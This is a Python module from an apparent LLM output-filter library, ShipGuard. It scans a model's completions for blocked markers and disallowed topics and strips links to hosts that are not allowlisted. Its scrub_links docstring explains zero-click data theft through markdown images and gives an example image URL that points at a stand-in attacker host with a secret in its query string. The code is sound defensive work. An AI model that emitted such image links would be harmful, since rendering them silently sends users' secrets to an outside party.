"""Checks applied to the model's completion before it reaches the user."""

from __future__ import annotations

import re
from urllib.parse import urlparse

from shipguard.config import OutputConfig, TopicRule
from shipguard.types import Finding

_MD_LINK = re.compile(r"(!?)\[([^\]]*)\]\(\s*(https?://[^)\s]+)[^)]*\)")
_BARE_URL = re.compile(r"https?://[^\s)\]>\"']+")


def host_allowed(url: str, allowed: list[str]) -> bool:
    host = (urlparse(url).hostname or "").lower()
    return any(host == h.lower() or host.endswith("." + h.lower()) for h in allowed)


def find_markers(text: str, markers: list[str]) -> list[Finding]:
    low = text.lower()
    return [Finding("output_policy", "blocked_marker", detail=m, where="completion")
            for m in markers if m.lower() in low]


def find_topics(text: str, topics: list[TopicRule], where: str, direction: str) -> list[Finding]:
    out: list[Finding] = []
    for t in topics:
        if direction == "input" and not t.scan_input:
            continue
        if direction == "output" and not t.scan_output:
            continue
        for pat in t.patterns:
            if re.search(pat, text, re.IGNORECASE):
                out.append(Finding("output_policy" if direction == "output" else "topic", "disallowed_topic",
                                   where=where, detail=t.name))
                break
    return out


def scrub_links(text: str, allowed_hosts: list[str]) -> tuple[str, list[Finding]]:
    """Remove markdown images/links and bare URLs pointing at non-allowlisted hosts.

    Markdown images are the classic zero-click exfiltration channel: the
    client renders ``![x](https://attacker.test/?d=SECRET)`` and leaks
    the query string without the user clicking anything. Images to
    non-allowlisted hosts are always removed; links and bare URLs are
    removed only when they carry a query string (a data channel), so
    ordinary references like ``https://docs.python.org/3/`` survive.
    """
    findings: list[Finding] = []

    def md(m: re.Match[str]) -> str:
        url = m.group(3)
        if host_allowed(url, allowed_hosts) or (not m.group(1) and "?" not in url):
            return m.group(0)
        kind = "exfil_markdown_image" if m.group(1) else "untrusted_link"
        findings.append(Finding("output_policy", kind, where="completion", detail=urlparse(url).hostname or ""))
        return f"[{m.group(2) or 'link'} removed by ShipGuard]"

    text = _MD_LINK.sub(md, text)

    def bare(m: re.Match[str]) -> str:
        url = m.group(0)
        if host_allowed(url, allowed_hosts) or "?" not in url:
            return url
        findings.append(Finding("output_policy", "untrusted_link", where="completion", detail=urlparse(url).hostname or ""))
        return "[link removed by ShipGuard]"

    text = _BARE_URL.sub(bare, text)
    return text, findings


def check_output(text: str, cfg: OutputConfig) -> list[Finding]:
    """Marker + topic checks (block-worthy). Links are handled by :func:`scrub_links`."""
    return find_markers(text, cfg.blocked_markers) + find_topics(text, cfg.disallowed_topics, "completion", "output")
